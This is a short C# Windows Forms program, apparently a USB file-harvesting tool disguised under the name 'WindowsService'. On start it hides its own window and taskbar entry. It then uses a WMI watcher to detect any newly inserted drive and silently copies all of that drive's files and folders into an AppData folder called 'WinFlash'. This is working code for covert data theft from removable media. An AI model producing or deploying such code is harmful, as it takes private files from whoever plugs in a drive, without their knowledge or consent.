using System;
using System.IO;
using System.Management;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace WindowsService
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public enum EventType
        {
            Inserted = 2
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Launch();
            string driveName = "";
            ManagementEventWatcher watcher = new ManagementEventWatcher();
            WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");

            watcher.EventArrived += (s, e1) =>
            {
                driveName = e1.NewEvent.Properties["DriveName"].Value.ToString();
                var sourceDirectoryPath = Path.Combine(driveName);
                var sourceDirectoryInfo = new DirectoryInfo(sourceDirectoryPath);

                var targetDirectoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinFlash");
                if (!Directory.Exists(targetDirectoryPath))
                {
                    Directory.CreateDirectory(targetDirectoryPath);
                }
                var targetDirectoryInfo = new DirectoryInfo(targetDirectoryPath);
                
                CopyFiles(sourceDirectoryInfo, targetDirectoryInfo);

            };

            watcher.Query = query;
            watcher.Start();
            
        }

        private void CopyFiles(DirectoryInfo source, DirectoryInfo target)
        {
            foreach (var file in source.GetFiles())
            {
                file.CopyTo(Path.Combine(target.FullName, file.Name), true);
            }

            foreach (var sourceSubdirectory in source.GetDirectories())
            {
                var targetSubdirectory = target.CreateSubdirectory(sourceSubdirectory.Name);
                CopyFiles(sourceSubdirectory, targetSubdirectory);
            }
        }
        private void Launch()
        {
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Hide();
            notifyIcon1.Visible = true;
            notifyIcon1.ShowBalloonTip(3000);
        }
        
        /*/
        private void button1_Click(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Hide();
            notifyIcon1.Visible = true;
            notifyIcon1.ShowBalloonTip(3000);
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.ShowInTaskbar = true;
            this.WindowState = FormWindowState.Normal;
            this.Show();
            notifyIcon1.Visible = false;
        }
        /*/


    }
}
